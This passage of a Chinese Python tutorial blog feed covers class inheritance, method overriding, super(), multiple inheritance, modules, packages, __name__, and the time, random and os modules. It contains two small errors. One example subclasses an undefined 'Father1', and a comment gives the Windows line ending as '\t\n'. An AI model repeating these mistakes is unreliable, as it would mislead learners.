class="hljs-built_in">print</span>(s.firstName,s.hobby)<br><span class="hljs-comment">#4.子类可以继承到父类的实例方法</span><br>s.get_xxx()<br><span class="hljs-comment">#5.子类可以继承到父类的类方法</span><br>Son.classFunc()<br><span class="hljs-comment">#6.子类可以继承到父类的静态方法</span><br>Son.staticFunc()<br></code></pre></td></tr></table></figure><p><a name="2d17ebb7"></a></p><h5 id="派生"><a href="#派生" class="headerlink" title="派生"></a>派生</h5><ul><li>子类添加自己独有的方法和或属性</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>():<br>    address = <span class="hljs-string">&#x27;Beijing&#x27;</span> <span class="hljs-comment">#类变量</span><br>    <span class="hljs-comment">#构造方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,fistName,hobby</span>):<br>        <span class="hljs-comment">#两个实例变量</span><br>        <span class="hljs-variable language_">self</span>.firstName = fistName<br>        <span class="hljs-variable language_">self</span>.hobby = hobby<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_xxx</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是Father的实例方法&#x27;</span>)<br><span class="hljs-meta">    @classmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">classFunc</span>(<span class="hljs-params">cls</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是Father类的类方法&#x27;</span>)<br><span class="hljs-meta">    @staticmethod</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">staticFunc</span>():<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是Father类的静态方法&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span>(<span class="hljs-title class_ inherited__">Father</span>):<br>    <span class="hljs-comment">#子类自己派生出来的独有的方法</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">sing</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;子类的实例方法sing&#x27;</span>)<br><br>s = Son(<span class="hljs-string">&#x27;zhang&#x27;</span>,<span class="hljs-string">&#x27;smoke&#x27;</span>)<br>s.sing()<br></code></pre></td></tr></table></figure><p><a name="f9c9f763"></a></p><h6 id="方法的重写"><a href="#方法的重写" class="headerlink" title="方法的重写"></a>方法的重写</h6><ul><li>重写:子类继承到父类的方法，如果满足不了子类的需求，则子类可以重写从父类中继承到的方法。重写父类方法有两种方式：1完全重写，2部分重写 <ul><li>1.完全重写：完全重新将父类的方法进行的全新的定义&#x2F;实现（毫无保留父类方法原始的功能）</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,firstName</span>):<br>        <span class="hljs-variable language_">self</span>.firstName = firstName<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hobby</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我喜欢读书，运动和跳舞！&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span>(<span class="hljs-title class_ inherited__">Father</span>):<br>    <span class="hljs-comment">#完全重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hobby</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我喜欢吃鸡，王者！&#x27;</span>)<br><br>s = Son(<span class="hljs-string">&#x27;zhang&#x27;</span>)<br>s.hobby()<br></code></pre></td></tr></table></figure><ul><li>2.部分重写：在父类方法功能实现的基础上新增了其他操作&#x2F;功能</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,firstName</span>):<br>        <span class="hljs-variable language_">self</span>.firstName = firstName<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hobby</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我喜欢读书，运动和跳舞！&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span>(<span class="hljs-title class_ inherited__">Father1</span>):<br>    <span class="hljs-comment">#部分重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hobby</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#调用一下父类的hobby方法</span><br>        <span class="hljs-built_in">super</span>().hobby() <span class="hljs-comment">#调用父类的方法</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我喜欢吃鸡，王者！&#x27;</span>)<br><br>s = Son(<span class="hljs-string">&#x27;zhang&#x27;</span>)<br>s.hobby()<br></code></pre></td></tr></table></figure><ul><li>super()只可以作用在类的内部，然后表示的是父类对象的引用。 </li><li>super函数 <ul><li>如果你想强制调用父类的成员该如何实现呢？使用super()函数！这是一个非常重要的函数，最常见的就是通过super调用父类的实例化方法<code>__init__</code>！ <ul><li>语法：<code>super(子类名, self).方法名()</code>，需要传入的是子类名和self，调用的是父类里的方法，按父类的方法需要传入参数。</li></ul></li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,firstName</span>):<br>        <span class="hljs-variable language_">self</span>.firstName = firstName<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hobby</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我喜欢读书，运动和跳舞！&#x27;</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span>(<span class="hljs-title class_ inherited__">Father</span>):<br>    <span class="hljs-comment">#子类需要有属于自己的实例变量</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self,firstName,classroom,score</span>):<br>        <span class="hljs-built_in">super</span>().__init__(firstName)<br>        <span class="hljs-comment">#子类自己派生出的独有的实例变量</span><br>        <span class="hljs-variable language_">self</span>.classroom = classroom<br>        <span class="hljs-variable language_">self</span>.score = score<br>    <span class="hljs-comment">#部分重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hobby</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#调用一下父类的hobby方法</span><br>        <span class="hljs-built_in">super</span>().hobby() <span class="hljs-comment">#调用父类的方法</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我喜欢吃鸡，王者！&#x27;</span>)<br><br>s = Son(<span class="hljs-string">&#x27;zhang&#x27;</span>,<span class="hljs-number">102</span>,<span class="hljs-number">100</span>)<br>s.hobby()<br></code></pre></td></tr></table></figure><ul><li>继承的作用： <ul><li>实现了程序的高复用，大大缩短程序的开发周期！</li></ul></li><li>在多继承中，继承关系的优先级</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father1</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hobby</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是Father1，我喜欢唱歌！&#x27;</span>)<br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Father2</span>():<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hobby</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是Father2，我喜欢跳舞！&#x27;</span>)<br>    <br><span class="hljs-comment">#注意：越靠前的父类越优先被继承</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Son</span>(Father1,Father2):<br>    <span class="hljs-comment">#方法的重写</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">hobby</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment">#思考：现在Son有两个父类，super()表示的是哪一个父类对象？</span><br>        <span class="hljs-comment">#输出结果显示super表示的是Father1对象</span><br>        <span class="hljs-built_in">super</span>().hobby()<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;我是Son，我喜欢吃鸡！&#x27;</span>)<br>s = Son()<br>s.hobby()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>技术文章</category>
      
    </categories>
    
    
    <tags>
      
      <tag>面向对象</tag>
      
      <tag>python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>python---模块与包</title>
    <link href="/2020/10/13/python---%E6%A8%A1%E5%9D%97%E4%B8%8E%E5%8C%85/"/>
    <url>/2020/10/13/python---%E6%A8%A1%E5%9D%97%E4%B8%8E%E5%8C%85/</url>
    
    <content type="html"><![CDATA[<p><a name="78add1a4"></a></p><h2 id="模块与包"><a href="#模块与包" class="headerlink" title="模块与包"></a>模块与包</h2><p><a name="fac54c34"></a></p><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p><a name="2ef4e31c"></a></p><h4 id="模块介绍"><a href="#模块介绍" class="headerlink" title="模块介绍"></a>模块介绍</h4><p>在计算机程序的开发过程中，随着程序代码越写越多，在一个文件里代码就会越来越长，越来越不容易维护。</p><p>为了编写可维护的代码，我们把很多函数分组，分别放到不同的文件里，这样，每个文件包含的代码就相对较少，很多编程语言都采用这种组织代码的方式。而这样的一个<code>py</code>文件在Python中称为模块（Module）。</p><p>模块是组织代码的更高级形式，大大提高了代码的阅读性和可维护性。</p><p>模块一共四种：</p><ul><li>解释器内建模块</li><li>python标准库</li><li>第三方模块</li><li>应用程序自定义模块</li></ul><p>另外，使用模块还可以避免函数名和变量名冲突。相同名字的函数和变量完全可以分别存在不同的模块中，因此，我们自己在编写模块时，不必考虑名字会与其他模块冲突。</p><p><a name="04ba4779"></a></p><h4 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"># 方式1：导入一个模块</span><br><span class="hljs-string">import 模块名</span><br><span class="hljs-string">import 模块名 as 别名</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 方式2：导入多个模块</span><br><span class="hljs-string">import (</span><br><span class="hljs-string">   模块1</span><br><span class="hljs-string">   模块2 </span><br><span class="hljs-string">   )</span><br><span class="hljs-string"></span><br><span class="hljs-string">import 模块1,模块2</span><br><span class="hljs-string"></span><br><span class="hljs-string"># 方式3：导入成员变量</span><br><span class="hljs-string">from 模块名 import 成员变量</span><br><span class="hljs-string">from 模块名 import *</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>导入模块时会执行模块，多次导入只执行一次。</p></blockquote><p>案例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">cal.py<br>logger.py<br>main.py<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#cal.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">return</span> x + y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">return</span> x * y<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;这是cal模块文件&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#logger.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_logger</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;打印日志！&#x27;</span>)<br>    <br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;这是logger模块文件&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#main.py</span><br><span class="hljs-keyword">import</span> cal <span class="hljs-comment">#导入了cal模块</span><br><span class="hljs-keyword">import</span> logger <span class="hljs-comment">#导入和logger模块</span><br><span class="hljs-comment">#注意：import导入模块，就好比是将模块中的代码执行了</span><br><span class="hljs-keyword">from</span> cal <span class="hljs-keyword">import</span> mul <span class="hljs-comment">#将cal模块中的mul成员进行导入</span><br><br><br><span class="hljs-comment">#调用用了cal模块中的add函数</span><br>result = cal.add(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(result)<br>c = mul(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)<br><span class="hljs-built_in">print</span>(c)<br><br><span class="hljs-comment">#调用了logger模块中的get_logger函数</span><br>logger.get_logger()<br></code></pre></td></tr></table></figure><ul><li>注意：执行源文件的名字一定不要和模块的名字同名</li></ul><p><a name="2e85ea11"></a></p><h4 id="name"><a href="#name" class="headerlink" title="__name__"></a><code>__name__</code></h4><p><code>__name__</code>是python内置变量，存储的是当前模块名称。</p><p>对于很多编程语言来说，程序都必须要有一个入口。像C，C++都有一个main函数作为程序的入口，而Python作为解释性脚本语言，没有一个统一的入口，因为Python程序运行时是从模块顶行开始，逐行进行翻译执行，所以，最顶层（没有被缩进）的代码都会被执行，所以Python中并不需要一个统一的main()作为程序的入口。</p><p>在刚才的案例中三个模块都打印一次<code>__name__</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#cal.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">return</span> x + y<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">mul</span>(<span class="hljs-params">x,y</span>):<br>    <span class="hljs-keyword">return</span> x * y<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;这是cal模块文件,__name__内置变量的值为：&#x27;</span>,__name__)<br><br><span class="hljs-comment">#logger.py</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_logger</span>():<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;打印日志！&#x27;</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;这是logger模块文件,__name__内置变量的值为：&#x27;</span>,__name__)<br><br><span class="hljs-comment">#main.py：作为执行文件</span><br><span class="hljs-keyword">import</span> cal <span class="hljs-comment">#导入了cal模块</span><br><span class="hljs-keyword">import</span> logger <span class="hljs-comment">#导入和logger模块</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;main文件的__name__这个内置变量为：&#x27;</span>,__name__)<br></code></pre></td></tr></table></figure><p>结果为：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">这是cal模块文件,<span class="hljs-emphasis">__name__</span>内置变量的值为： cal<br>这是logger模块文件,<span class="hljs-emphasis">__name__</span>内置变量的值为： logger<br>main文件的<span class="hljs-emphasis">__name__</span>这个内置变量为： <span class="hljs-emphasis">__main__</span><br></code></pre></td></tr></table></figure><p>通过结果发现<code>__name__</code>只有在执行模块中打印<code>__main__</code>,在其他导入模块中打印各自模块的名称。</p><p>所以，<code>__name__</code>可以有以下作用：</p><ul><li>利用<code>__name__==&quot;__main__&quot;</code>声明程序入口。</li><li>可以对导入的模块进行功能测试</li></ul><p><a name="5442dfce"></a></p><h3 id="包"><a href="#包" class="headerlink" title="包"></a>包</h3><p><a name="ee9dc367"></a></p><h4 id="什么是包"><a href="#什么是包" class="headerlink" title="什么是包"></a>什么是包</h4><p>当一个项目中模块越来越多，维护和开发不是那么高效的时候，我们可以引入一种比模块更高级语法：包。</p><p>包是对相关功能的模块<code>py</code>文件的组织方式。</p><p>包可以理解为文件夹，更确切的说，是一个包含<code>__init__</code>文件的文件夹。</p><p><a name="f32becd8"></a></p><h4 id="导入包的语法"><a href="#导入包的语法" class="headerlink" title="导入包的语法"></a>导入包的语法</h4><ol><li><code>import 包名[.模块名 [as 别名]]</code></li><li><code>from 包名 import 模块名 [as 别名]</code></li><li><code>from 包名.模块名 import 成员名 [as 别名]</code></li></ol><p>案例：将上面案例中的<code>cal .py</code>文件放到<code>utils</code>包中管理，<code>logger.py</code>放到<code>logger</code>包中管理。</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs applescript"><span class="hljs-comment">-- demo</span><br>   main.py  <span class="hljs-comment">#执行文件</span><br>   <span class="hljs-comment">-- m_log #包</span><br>   __init__.py<br>      logger.py <span class="hljs-comment">#存储在logger包中的一个模块</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> m_log <span class="hljs-keyword">import</span> logger<br>logger.get_logger() <span class="hljs-comment">#调用了logger模块中的get_logger函数</span><br></code></pre></td></tr></table></figure><p><a name="730ee094"></a></p><h2 id="常见模块"><a href="#常见模块" class="headerlink" title="常见模块"></a>常见模块</h2><p><a name="1848c41b"></a></p><h3 id="time模块"><a href="#time模块" class="headerlink" title="time模块"></a>time模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># &lt;1&gt; 时间戳</span><br><br><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> time<br><span class="hljs-meta">&gt;&gt;&gt; </span>time.time()     <br><span class="hljs-number">1493136727.099066</span><br><br><span class="hljs-comment"># &lt;2&gt; 时间字符串</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>time.strftime(<span class="hljs-string">&quot;%Y-%m-%d %X&quot;</span>) <span class="hljs-comment">#%Y:年 %m：月 %d：天 %X:时分秒</span><br><span class="hljs-string">&#x27;2017-04-26 00:32:18&#x27;</span><br><br><span class="hljs-comment">#&lt;3&gt; 程序暂定固定的时间</span><br><span class="hljs-keyword">import</span> time<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;正在下载数据......&#x27;</span>)<br>time.sleep(<span class="hljs-number">2</span>) <span class="hljs-comment">#程序暂定n秒</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;下载成功！&#x27;</span>)<br></code></pre></td></tr></table></figure><p>小结：时间戳是计算机能够识别的时间；时间字符串是人能够看懂的时间；元组则是用来操作时间的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-comment">#计算一组程序执行的耗时</span><br>start = time.time()<br><span class="hljs-comment">#测试代码</span><br>num = <span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000000</span>):<br>    num += <span class="hljs-number">1</span><br><span class="hljs-built_in">print</span>(num)<br><span class="hljs-comment">##############################</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;总耗时：&#x27;</span>,time.time()-start)<br></code></pre></td></tr></table></figure><p><a name="f6ee4702"></a></p><h3 id="random模块"><a href="#random模块" class="headerlink" title="random模块"></a>random模块</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">import</span> random<br><span class="hljs-meta">&gt;&gt;&gt; </span>random.random()      <span class="hljs-comment"># 大于0且小于1之间的小数</span><br><span class="hljs-number">0.7664338663654585</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>random.randint(<span class="hljs-number">1</span>,<span class="hljs-number">5</span>)  <span class="hljs-comment"># 大于等于1且小于等于5之间的整数</span><br><span class="hljs-number">2</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>random.randrange(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>) <span class="hljs-comment"># 大于等于1且小于3之间的整数</span><br><span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>random.choice([<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;23&#x27;</span>,[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]])  <span class="hljs-comment"># 返回列表中的随机一个元素</span><br><span class="hljs-number">1</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>random.sample([<span class="hljs-number">1</span>,<span class="hljs-string">&#x27;23&#x27;</span>,[<span class="hljs-number">4</span>,<span class="hljs-number">5</span>]],<span class="hljs-number">2</span>) <span class="hljs-comment"># 列表元素任意2个随机组合</span><br>[[<span class="hljs-number">4</span>, <span class="hljs-number">5</span>], <span class="hljs-string">&#x27;23&#x27;</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>random.uniform(<span class="hljs-number">1</span>,<span class="hljs-number">3</span>) <span class="hljs-comment">#大于1小于3的小数</span><br><span class="hljs-number">1.6270147180533838</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>item=[<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">5</span>,<span class="hljs-number">7</span>,<span class="hljs-number">9</span>]<br><span class="hljs-meta">&gt;&gt;&gt; </span>random.shuffle(item) <span class="hljs-comment"># 直接将原来的列表元素打乱次序，不会返回一个新列表</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>item<br>[<span class="hljs-number">5</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>]<br></code></pre></td></tr></table></figure><p><a name="38dea97d"></a></p><h3 id="os模块"><a href="#os模块" class="headerlink" title="os模块"></a>os模块</h3><p>os模块是与操作系统交互的一个接口</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>os.getcwd() <span class="hljs-comment"># 获取当前工作目录，即当前python脚本工作的目录路径</span><br>os.chdir(<span class="hljs-string">&quot;dirname&quot;</span>)  <span class="hljs-comment"># 改变当前脚本工作目录；相当于shell下cd</span><br>os.curdir   <span class="hljs-comment"># 返回当前目录: (&#x27;.&#x27;)</span><br>os.pardir  <span class="hljs-comment"># 获取当前目录的父目录字符串名：(&#x27;..&#x27;)</span><br>os.makedirs(<span class="hljs-string">&#x27;dirname1/dirname2&#x27;</span>)   <span class="hljs-comment"># ***可生成多层递归目录</span><br>os.removedirs(<span class="hljs-string">&#x27;dirname1&#x27;</span>)    <span class="hljs-comment"># ***若目录为空，则删除，并递归到上一级目录，如若也为空，则删除，依此类推</span><br>os.mkdir(<span class="hljs-string">&#x27;dirname&#x27;</span>)    <span class="hljs-comment">#*** 生成单级目录；相当于shell中mkdir dirname</span><br>os.rmdir(<span class="hljs-string">&#x27;dirname&#x27;</span>)    <span class="hljs-comment"># *** 删除单级空目录，若目录不为空则无法删除，报错；相当于shell中rmdir dirname</span><br>os.listdir(<span class="hljs-string">&#x27;dirname&#x27;</span>)    <span class="hljs-comment"># ***列出指定目录下的所有文件和子目录，包括隐藏文件，并以列表方式打印</span><br>os.remove()  <span class="hljs-comment">#*** 删除一个文件</span><br>os.rename(<span class="hljs-string">&quot;oldname&quot;</span>,<span class="hljs-string">&quot;newname&quot;</span>)  <span class="hljs-comment">#*** 重命名文件/目录</span><br>os.stat(<span class="hljs-string">&#x27;path/filename&#x27;</span>) <span class="hljs-comment">#  获取文件/目录信息</span><br>os.sep    <span class="hljs-comment"># 输出操作系统特定的路径分隔符，win下为&quot;\\&quot;,Linux下为&quot;/&quot;</span><br>os.linesep    <span class="hljs-comment"># 输出当前平台使用的行终止符，win下为&quot;\t\n&quot;,Linux下为&quot;\n&quot;</span><br>os.pathsep    